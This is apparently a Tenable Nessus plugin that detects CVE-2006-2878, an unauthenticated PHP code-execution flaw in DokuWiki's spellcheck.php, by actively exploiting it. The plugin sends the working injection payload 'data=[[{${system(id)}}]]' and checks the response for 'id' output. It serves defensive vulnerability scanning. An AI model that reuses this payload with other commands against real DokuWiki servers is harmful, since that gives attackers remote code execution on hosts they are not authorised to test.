#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21662);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2006-2878");
  script_bugtraq_id(18289);
  script_osvdb_id(25980);

  script_name(english:"DokuWiki Spell Checker Embedded Link Arbitrary PHP Code Execution");
  script_summary(english:"Executes arbitrary PHP code via DocuWiki spellcheck");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an arbitrary code execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running DokuWiki, an open source wiki application
written in PHP. 

The installed version of DokuWiki fails to properly sanitize input to
the 'data' parameter of the 'lib/exe/spellcheck.php' script before
evaluating it to handle links embedded in the text.  An
unauthenticated attacker can leverage this issue with PHP commands in
'complex curly syntax' to execute arbitrary PHP code on the remote
host subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory_042006.119.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/435989/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://bugs.splitbrain.org/index.php?do=details&id=823" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to DokuWiki release 2006-03-09 with hotfix 823 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');

 script_set_attribute(attribute:"plugin_publication_date", value: "2006/06/06");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/06/04");
 script_cvs_date("$Date: 2016/05/05 16:01:12 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:andreas_gohr:dokuwiki");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("dokuwiki_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/dokuwiki");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/dokuwiki"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the script exists.
  url = string(dir, "/lib/exe/spellcheck.php");
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ("The called function does not exist!" >< res)
  {
    # Try to exploit the flaw to run a command.
    cmd = "id";
    postdata = string(
      "call=check&",
      "utf8=1&",
      "data=[[{${system(", cmd, ")}}]]"
    );
    r = http_send_recv3(method: "POST", item: url, version: 11,
      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
      data: postdata, 
      port:port);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if...
    if (
      # the output looks like it's from id or...
      egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
      # PHP's disable_functions prevents running system().
      egrep(pattern:"Warning.+\(\) has been disabled for security reasons", string:res)
    )
    {
      if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
      {
        output = res - strstr(res, "0[[");
        report = string(
          "Nessus was able to execute the command '", cmd, "' on the remote host,\n",
          "which produced the following output :\n",
          "\n",
          output
        );
      }
      else report = NULL;

      security_hole(port:port, extra: report);
      exit(0);
    }
  }
}
